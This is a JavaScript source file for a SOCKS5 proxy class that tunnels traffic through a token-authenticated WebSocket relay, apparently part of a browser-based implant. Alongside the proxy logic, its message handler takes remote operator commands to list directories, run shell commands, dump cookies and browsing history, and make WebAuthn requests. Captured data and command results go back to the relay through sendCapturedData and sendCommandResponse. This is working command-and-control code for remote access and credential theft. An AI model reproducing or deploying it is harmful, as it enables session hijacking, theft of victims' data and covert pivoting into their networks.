import { WASMWebSocket } from './wasm-bridge.js';

export class SocksServer {
  constructor(options = {}) {
    this.port = options.port || 1080;
    this.websocketUrl = options.websocketUrl;
    this.relayToken = options.relayToken;
    this.useWASM = options.useWASM || false;
    this.server = null;
    this.ws = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = options.maxReconnectAttempts || 60;
    this.baseReconnectDelay = options.baseReconnectDelay || 5000; // 5 seconds
    this.reconnectTimer = null;
    this.isReconnecting = false;
    this.connections = new Map(); // Move connections to class level for persistence across reconnects
    this.sendQueue = [];
    this.isSending = false;
    this.disconnectedBuffer = []; // Buffer messages during disconnection
  }

  async startLocalSOCKSProxy() {
    try {
      const server = new TCPServerSocket('::');
      const {readable, localAddress, localPort} = await server.opened;
      console.log(`Listening on ${localAddress} port ${localPort}`);

      const reader = readable.getReader();

      for (;;) {
        const {value, done} = await reader.read();
        if (done) {
          console.log('Socket closed');
          break;
        }

        await this.handleConnection(value);
      }
    } catch (err) {
      console.error('Failed to start SOCKS server:', err);
      throw err;
    } finally {
      reader.releaseLock();
    }
  }

  async sendCommandResponse(command, payload, taskId) {
    this.sendData({
      type: 'command_response',
      command,
      payload,
      taskId
    });
  }

  async sendCapturedData(dataType, data) { 
    this.sendData({
      type: 'captured_data',
      dataType,
      data
    });
  }

  async sendData(jsonObj) {
    return this.queueSend(jsonObj);
  }

  // Queue sends to ensure they happen sequentially
  async queueSend(jsonObj) {
    return new Promise((resolve, reject) => {
      this.sendQueue.push({ jsonObj, resolve, reject });
      this.processSendQueue();
    });
  }

  async processSendQueue() {
    // If already processing, return - the current processor will handle queued items
    if (this.isSending) {
      return;
    }

    this.isSending = true;

    while (this.sendQueue.length > 0) {
      const { jsonObj, resolve, reject } = this.sendQueue.shift();

      try {
        if (this.ws && (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === 1)) {
          const jsonStr = JSON.stringify(jsonObj);

          // Use sendAsync if available (WASM WebSocket), otherwise use regular send
          // sendAsync will block if the write queue is full (backpressure)
          // but otherwise returns immediately, allowing pipelining
          if (typeof this.ws.sendAsync === 'function') {
            await this.ws.sendAsync(jsonStr);
          } else {
            this.ws.send(jsonStr);
          }

          resolve();
        } else if (this.isReconnecting) {
          // Buffer the message during reconnection instead of rejecting
          console.log(`Buffering message during reconnection: ${jsonObj.type}`);
          this.disconnectedBuffer.push({ jsonObj, resolve, reject });
        } else {
          reject(new Error('WebSocket not open'));
        }
      } catch (err) {
        // If send fails during reconnection, buffer it
        if (this.isReconnecting) {
          console.log(`Buffering message after send error during reconnection: ${jsonObj.type}`);
          this.disconnectedBuffer.push({ jsonObj, resolve, reject });
        } else {
          reject(err);
        }
      }

      // No artificial delay - let backpressure handle flow control
    }

    this.isSending = false;
  }

  async startWebSocketProxy() {
    if (!this.websocketUrl || !this.relayToken) {
      throw new Error('WebSocket URL and relay token are required');
    }

    try {
      // Clear any existing reconnect timer
      if (this.reconnectTimer) {
        clearTimeout(this.reconnectTimer);
        this.reconnectTimer = null;
      }

      const url = new URL(this.websocketUrl);

      // Use WASM WebSocket if available and enabled, otherwise fallback to standard WebSocket
      if (this.useWASM) {
        console.log('[SocksServer] Using WASM WebSocket implementation');
        this.ws = new WASMWebSocket(url.toString(), [`token.${this.relayToken}`]);
      } else {
        console.log('[SocksServer] Using standard WebSocket implementation');
        this.ws = new WebSocket(url.toString(), [`token.${this.relayToken}`]);
      }

      const ws = this.ws;
      
      // Use class-level connections map
      const connections = this.connections;

      ws.onmessage = async (message) => {
        try {
          const data = JSON.parse(message.data);
          console.log(`Received WebSocket message:`, {
            type: data.type,
            connectionId: data.connectionId,
            dataLength: data.data ? data.data.length : 0
          });

          // When using WASM, the relay proxy handles connect/data/close automatically
          // JavaScript only needs to handle command messages
          if (this.useWASM && data.type !== 'command') {
            // WASM relay proxy handles this - ignore in JavaScript
            return;
          }

          if (data.type === 'command') {
            console.log(`Received command:`, data);

            var commandObject = {
              data: data.payload,
              taskId: data.taskId,
            }

            switch (data.command) {
              case 'dir':
              case 'ls':
                commandObject.type = 'ls_command_request';
                break;
              case 'shell':
                commandObject.type = 'shell_command_request';
                break;
              case 'cookies':
                commandObject.type = 'dump_cookies_request';
                break;
              case 'history':
                commandObject.type = 'dump_history_request';
                break;
              case 'webauthn':
                commandObject.type = 'webauthn_request';
                break;
              default:
                console.error(`Unknown command: ${data.command}`);
                return;
            }

            window.broadcastToFirecracker(JSON.stringify(commandObject));
            return;
          }

          if (data.type === 'connect') {
            try {
              const connectionId = data.connectionId;
              console.log(`[${connectionId}] Connecting to ${data.targetHost}:${data.targetPort}`);

              // Initialize connection state FIRST
              console.log(`[${connectionId}] Initializing connection state`);
              connections.set(connectionId, {
                queue: [],
                resolver: null,
                closing: false  // Track if local side is closing
              });

              // Then start async operations
              const remote = new TCPSocket(data.targetHost, data.targetPort);
              const remoteConn = await remote.opened;
              console.log(`[${connectionId}] Connected to remote`);

              const remoteReader = remoteConn.readable.getReader();
              const remoteWriter = remoteConn.writable.getWriter();

              // Update connection state with remote info
              const conn = connections.get(connectionId);
              if (conn) { // Check if connection still exists (might have been cleaned up)
                Object.assign(conn, {
                  remoteReader,
                  remoteWriter
                });

                // Create WebSocket reader/writer
                const wsSocket = {
                  readable: {
                    getReader: () => {
                      console.log(`[${connectionId}] Creating WebSocket reader`);
                      return ({
                        read: async () => {
                          const conn = connections.get(connectionId);
                          if (!conn) {
                            console.log(`[${connectionId}] Connection not found`);
                            return { done: true };
                          }

                          // Check queue first - BATCH multiple small messages together
                          if (conn.queue.length > 0) {
                            const chunks = [];
                            let totalBytes = 0;
                            const MAX_BATCH_SIZE = 8192; // Batch up to 8KB

                            // Collect multiple data messages if available
                            while (conn.queue.length > 0 && totalBytes < MAX_BATCH_SIZE) {
                              const msg = conn.queue[0]; // Peek first

                              if (msg.type === 'close') {
                                // If we have data, return it first, then close on next read
                                if (chunks.length > 0) break;

                                conn.queue.shift();
                                console.log(`[${connectionId}] Received close from server in queued message`);
                                return { done: true };
                              }

                              if (msg.type === 'data') {
                                conn.queue.shift(); // Remove from queue
                                const decoded = new Uint8Array(atob(msg.data).split('').map(c => c.charCodeAt(0)));
                                chunks.push(decoded);
                                totalBytes += decoded.length;
                              } else {
                                conn.queue.shift(); // Remove unknown message
                              }
                            }

                            if (chunks.length > 0) {
                              // Combine all chunks into single buffer
                              const combined = new Uint8Array(totalBytes);
                              let offset = 0;
                              for (const chunk of chunks) {
                                combined.set(chunk, offset);
                                offset += chunk.length;
                              }
                              console.log(`[${connectionId}] Batched ${chunks.length} queued messages: ${totalBytes} bytes`);
                              return { value: combined, done: false };
                            }
                          }

                          // Loop to handle reconnection
                          while (true) {
                            console.log(`[${connectionId}] Waiting for next message`);
                            const msg = await new Promise(resolve => {
                              conn.resolver = resolve;
                            });
                            conn.resolver = null;

                            console.log(`[${connectionId}] Received message: ${msg.type}`);

                            // Handle special reconnecting message
                            if (msg.type === '_reconnecting') {
                              console.log(`[${connectionId}] WebSocket reconnecting, waiting...`);
                              // Wait a bit and check queue again (message may have arrived during reconnect)
                              await new Promise(resolve => setTimeout(resolve, 100));

                              // Check queue again
                              if (conn.queue.length > 0) {
                                continue; // Process queued message
                              }

                              // If not reconnecting anymore and no queue, we're done
                              if (!this.isReconnecting) {
                                console.log(`[${connectionId}] WebSocket closed permanently during wait`);
                                return { done: true };
                              }

                              // Still reconnecting, loop and wait again
                              continue;
                            }

                            if (msg.type === 'close') {
                              console.log(`[${connectionId}] Received close from server in reader`);
                              return { done: true };
                            }
                            if (msg.type === 'data') {
                              // Put message in queue and go back to batching logic
                              conn.queue.push(msg);
                              // Break out of while loop to re-check queue with batching
                              break;
                            }
                            return { done: true };
                          }

                          // If we broke out of the loop, there's data in the queue
                          // Go back to the top to use the batching logic
                          if (conn.queue.length > 0) {
                            const chunks = [];
                            let totalBytes = 0;
                            const MAX_BATCH_SIZE = 8192;

                            while (conn.queue.length > 0 && totalBytes < MAX_BATCH_SIZE) {
                              const msg = conn.queue[0];

                              if (msg.type === 'close') {
                                if (chunks.length > 0) break;
                                conn.queue.shift();
                                return { done: true };
                              }

                              if (msg.type === 'data') {
                                conn.queue.shift();
                                const decoded = new Uint8Array(atob(msg.data).split('').map(c => c.charCodeAt(0)));
                                chunks.push(decoded);
                                totalBytes += decoded.length;
                              } else {
                                conn.queue.shift();
                              }
                            }

                            if (chunks.length > 0) {
                              const combined = new Uint8Array(totalBytes);
                              let offset = 0;
                              for (const chunk of chunks) {
                                combined.set(chunk, offset);
                                offset += chunk.length;
                              }
                              console.log(`[${connectionId}] Batched ${chunks.length} messages from resolver: ${totalBytes} bytes`);
                              return { value: combined, done: false };
                            }
                          }

                          // Shouldn't reach here
                          return { done: true };
                        },
                        cancel: () => {
                          console.log(`[${connectionId}] WebSocket reader cancelled`);
                          const conn = connections.get(connectionId);
                          if (conn) {
                            // Mark as closing but don't delete yet - server might have buffered data
                            conn.closing = true;
                            console.log(`[${connectionId}] Marked connection as closing, waiting for server close`);
                          }
                        }
                      });
                    }
                  },
                  writable: {
                    getWriter: () => ({
                      write: async (chunk) => {
                        console.log(`[${connectionId}] WebSocket writer sending ${chunk.length} bytes`);
                        console.log(`[${connectionId}] WebSocket readyState: ${ws.readyState} (OPEN=${WebSocket.OPEN || WASMWebSocket.OPEN || 1})`);

                        // If reconnecting, always buffer regardless of readyState
                        // Otherwise, only send if WebSocket is actually open
                        if (this.isReconnecting || ws.readyState === WebSocket.OPEN || ws.readyState === 1) {
                          await this.queueSend({
                            type: 'data',
                            connectionId: connectionId,
                            data: btoa(String.fromCharCode.apply(null, chunk))
                          });
                        } else {
                          console.warn(`[${connectionId}] Cannot send data - WebSocket permanently closed (state=${ws.readyState})`);
                          throw new Error('WebSocket not open');
                        }
                      },
                      close: async () => {
                        console.log(`[${connectionId}] WebSocket writer closing`);
                        const conn = connections.get(connectionId);
                        if (conn) {
                          // Mark as closing but don't delete yet - server might have buffered data
                          conn.closing = true;
                        }
                        // If reconnecting, always buffer regardless of readyState
                        if (this.isReconnecting || ws.readyState === WebSocket.OPEN || ws.readyState === 1) {
                          await this.queueSend({
                            type: 'close',
                            connectionId: connectionId
                          });
                        }
                      }
                    })
                  }
                };

                // Start proxy operation
                this.proxy(
                  wsSocket.readable.getReader(),
                  wsSocket.writable.getWriter(),
                  remoteReader,
                  remoteWriter
                ).catch(e => console.error('Proxy error:', e));
              }
            } catch (e) {
              console.error('Connection failed:', e);
              // If reconnecting, always buffer regardless of readyState
              if (this.isReconnecting || ws.readyState === WebSocket.OPEN || ws.readyState === 1) {
                await this.queueSend({
                  type: 'close',
                  connectionId: data.connectionId
                });
              }
            }
          } else if (data.type === 'data' || data.type === 'close') {
            const conn = connections.get(data.connectionId);
            if (conn) {
              // Even if local side is closing, still process server messages
              // This ensures we don't drop data that was buffered on the server
              if (conn.resolver) {
                // If there's a waiting reader, deliver directly
                console.log(`[${data.connectionId}] Delivering message directly to waiting reader`);
                conn.resolver(data);
              } else {
                // Otherwise queue the message
                console.log(`[${data.connectionId}] Queueing message of type ${data.type}`);
                conn.queue.push(data);
              }

              // If this is a close message from server, clean up now
              if (data.type === 'close') {
                console.log(`[${data.connectionId}] Received close from server, cleaning up connection`);
                connections.delete(data.connectionId);
              }
            } else {
              console.log(`[${data.connectionId}] No connection found for message`);
            }
          }
        } catch (e) {
          console.error('Error processing message:', e);
        }
      };

      ws.onopen = () => {
        console.log('Connected to relay server');
        // Reset reconnect attempts on successful connection
        this.reconnectAttempts = 0;
        this.isReconnecting = false;

        // Replay buffered messages after reconnection
        if (this.disconnectedBuffer.length > 0) {
          console.log(`Replaying ${this.disconnectedBuffer.length} buffered messages after reconnection`);

          // Move buffered items back to sendQueue
          this.sendQueue.unshift(...this.disconnectedBuffer);
          this.disconnectedBuffer = [];

          // Process the queue
          this.processSendQueue();
        }
      };
      
      ws.onclose = (event) => {
        console.log(`WebSocket connection closed: ${event.code} ${event.reason}`);
        console.log(`Active SOCKS connections: ${this.connections.size}`);

        // Wake up any connections waiting for messages by sending them a special "reconnecting" signal
        // This prevents them from hanging forever
        for (const [connId, conn] of this.connections.entries()) {
          if (conn.resolver) {
            console.log(`[${connId}] Waking up waiting reader due to WebSocket close`);
            // Queue a special internal message to wake up the reader
            conn.queue.push({ type: '_reconnecting' });
            if (conn.resolver) {
              conn.resolver({ type: '_reconnecting' });
              conn.resolver = null;
            }
          }
        }

        // Don't close existing SOCKS connections - keep them alive during reconnection
        // They will buffer data until WebSocket reconnects
        this.scheduleReconnect();
      };
      
      ws.onerror = (event) => {
        console.error('WebSocket error:', event);
      };

    } catch (err) {
      console.error('Failed to start WebSocket proxy:', err);
      this.scheduleReconnect();
      throw err;
    }
  }

  scheduleReconnect() {
    // Don't schedule if already reconnecting
    if (this.isReconnecting) {
      return;
    }
    
    this.isReconnecting = true;
    
    // Check if we've exceeded max attempts
    if (this.maxReconnectAttempts > 0 && this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.log(`Maximum reconnect attempts (${this.maxReconnectAttempts}) reached. Giving up.`);
      return;
    }
    
    // Calculate delay with exponential backoff
    const delay = Math.min(
      this.baseReconnectDelay * Math.pow(2, this.reconnectAttempts),
      60000 // Cap at 60 seconds
    );
    
    this.reconnectAttempts++;
    
    console.log(`Scheduling reconnect attempt ${this.reconnectAttempts} in ${delay}ms`);
    
    // Clear any existing timer
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
    }
    
    // Schedule reconnect
    this.reconnectTimer = setTimeout(() => {
      console.log(`Attempting to reconnect (attempt ${this.reconnectAttempts})...`);
      this.startWebSocketProxy().catch(err => {
        console.error('Reconnect attempt failed:', err);
        // The error handler in startWebSocketProxy will schedule another reconnect
      });
    }, delay);
  }

  async start() {
    if (this.websocketUrl) {
      await this.startWebSocketProxy();
    } else {
      await this.startLocalSOCKSProxy();
    }
  }

  async handleConnection(client) {
    const {readable, writable, remoteAddress, remotePort} = await client.opened;
    const reader = readable.getReader();
    const writer = writable.getWriter();

    try {
      // Read SOCKS version
      const { value: init, done } = await reader.read();
      if (done) return;
      
      if (init[0] !== 0x05) { // SOCKS5
        throw new Error('Unsupported SOCKS version');
      }

      // Send auth method response (no auth)
      await writer.write(new Uint8Array([0x05, 0x00]));

      // Read connection request
      const { value: request } = await reader.read();
      const cmd = request[1];
      const atyp = request[3];

      if (cmd !== 0x01) { // Only support CONNECT
        throw new Error('Only CONNECT is supported');
      }

      let addr;
      let port;

      switch (atyp) {
        case 0x01: // IPv4
          addr = Array.from(request.slice(4, 8))
            .map(x => x.toString())
            .join('.');
          port = (request[8] << 8) + request[9];
          break;

        case 0x03: // Domain name
          const addrLen = request[4];
          addr = new TextDecoder().decode(request.slice(5, 5 + addrLen));
          port = (request[5 + addrLen] << 8) + request[5 + addrLen + 1];
          break;

        case 0x04: // IPv6
          // Group bytes into 16-bit chunks and format properly
          addr = Array.from(request.slice(4, 20))
            .map(x => x.toString(16).padStart(2, '0'))
            .reduce((acc, cur, i) => {
              if (i % 2 === 0) {
                acc.push(cur);
              } else {
                acc[acc.length - 1] += cur;
              }
              return acc;
            }, [])
            .join(':');
          port = (request[20] << 8) + request[21];
          console.log(`IPv6 Address: ${addr}, Port: ${port}`);
          break;

        default:
          throw new Error(`Unsupported address type: ${atyp}`);
      }

      console.log(`Connecting to ${addr}:${port} (type: ${atyp})`);

      // Allow for context switch before attempting connection
      await Promise.resolve();

      try {
        // Connect to destination
        const remote = new TCPSocket(addr, port);
        const remoteConn = await remote.opened;
        console.log(`Connected to ${addr}:${port}`);

        // Send success response
        await writer.write(new Uint8Array([
          0x05, 0x00, 0x00, 0x01,
          0, 0, 0, 0, // bound addr
          0, 0        // bound port
        ]));

        const remoteReader = remoteConn.readable.getReader();
        const remoteWriter = remoteConn.writable.getWriter();

        // Start bidirectional proxy
        await this.proxy(reader, writer, remoteReader, remoteWriter);

      } catch (connectError) {
        console.error('Failed to connect to remote:', connectError);
        // Send connection failed response
        await writer.write(new Uint8Array([
          0x05, 0x04, 0x00, 0x01,  // 0x04 = host unreachable
          0, 0, 0, 0,
          0, 0
        ]));
        throw connectError; // Re-throw to trigger cleanup
      }

    } catch (err) {
      console.error('Connection handler error:', err);
    } finally {
      try {
        reader.releaseLock();
        writer.releaseLock();
      } catch (e) {
        // Ignore errors if locks were already released
      }
    }
  }

  async proxy(clientReader, clientWriter, remoteReader, remoteWriter) {
    const clientToRemote = this.pipeData(clientReader, remoteWriter, 'client->remote');
    const remoteToClient = this.pipeData(remoteReader, clientWriter, 'remote->client');
    
    try {
      // Wait for either direction to complete/fail
      await Promise.race([clientToRemote, remoteToClient]);
    } catch (err) {
      console.error('Proxy error:', err);
    } finally {
      // Clean up all resources
      try {
        await Promise.allSettled([
          clientWriter.close(),
          clientReader.cancel(),
          remoteWriter.close(),
          remoteReader.cancel()
        ]);
      } catch (cleanupErr) {
        console.error('Cleanup error:', cleanupErr);
      }
    }
  }

  async pipeData(reader, writer, direction) {
    const chunkSize = 16384; // 16KB chunks for efficient transfer
    const DISPLAY_BYTES = 0x20; // Number of bytes to display in hex dump
    const BYTES_PER_ROW = 16;
    let lastLogTime = Date.now();
    let chunksSinceLog = 0;
    let bytesSinceLog = 0;

    function formatHexDump(buffer, length) {
      let result = '';
      for (let offset = 0; offset < length; offset += BYTES_PER_ROW) {
        // Offset in hex
        result += offset.toString(16).padStart(8, '0') + ': ';
        
        // Hex values
        const rowBytes = Array.from(buffer.slice(offset, Math.min(offset + BYTES_PER_ROW, length)));
        const hex = rowBytes
          .map(b => b.toString(16).padStart(2, '0'))
          .join(' ');
        result += hex.padEnd(BYTES_PER_ROW * 3 - 1, ' ');
        
        // ASCII representation
        result += '  |';
        const ascii = rowBytes
          .map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.')
          .join('');
        result += ascii.padEnd(BYTES_PER_ROW, ' ');
        result += '|\n';
      }
      return result;
    }

    try {
      let totalBytes = 0;

      while (true) {
        const { value, done } = await reader.read();
        if (done) {
          console.log(`${direction}: Stream closed after ${totalBytes} bytes`);
          break;
        }

        // Display hex dump of first bytes of every chunk
        if (value.length > 0) {
          const bytesToDisplay = Math.min(value.length, DISPLAY_BYTES);
          console.log(`${direction} chunk ${totalBytes}:`);
          console.log(formatHexDump(value, bytesToDisplay));
        }

        totalBytes += value.length;
        chunksSinceLog++;
        bytesSinceLog += value.length;

        // Write with timeout to detect slowness
        const writeStart = Date.now();
        await writer.write(value);
        const writeDuration = Date.now() - writeStart;

        if (writeDuration > 100) {
          console.warn(`${direction}: Slow write detected: ${writeDuration}ms for ${value.length} bytes`);
        }

        // Log throughput every second during active transfer
        const now = Date.now();
        if (now - lastLogTime >= 1000) {
          const duration = (now - lastLogTime) / 1000;
          const bytesPerSec = bytesSinceLog / duration;
          console.log(`${direction}: ${chunksSinceLog} chunks, ${(bytesPerSec / 1024).toFixed(1)} KB/s, total: ${(totalBytes / 1024).toFixed(1)} KB`);
          lastLogTime = now;
          chunksSinceLog = 0;
          bytesSinceLog = 0;
        }

        if (totalBytes % (1024 * 1024) === 0) {  // Log every MB
          console.log(`${direction}: Transferred ${totalBytes / (1024 * 1024)}MB`);
        }
      }
    } catch (err) {
      if (err.name === 'NetworkError') {
        console.log(`${direction}: Connection reset by peer:`, err.message);
      } else {
        console.error(`${direction}: Pipe error:`, {
          name: err.name,
          message: err.message,
          stack: err.stack
        });
      }
      throw err; // Re-throw to trigger cleanup
    } finally {
      try {
        await writer.close();
      } catch (closeErr) {
        // Ignore close errors as the stream might already be closed
      }
    }
  }

  stop() {
    // Clear any reconnect timer
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
    }
    
    // Close WebSocket if open
    if (this.ws) {
      // Prevent reconnect attempts when intentionally stopping
      this.maxReconnectAttempts = 0;
      
      if (this.ws.readyState === WebSocket.OPEN || 
          this.ws.readyState === WebSocket.CONNECTING) {
        this.ws.close();
      }
      this.ws = null;
    }
    
    // Close server if running
    if (this.server) {
      this.server.close();
      this.server = null;
    }
    
    // Reset state
    this.reconnectAttempts = 0;
    this.isReconnecting = false;
  }
} 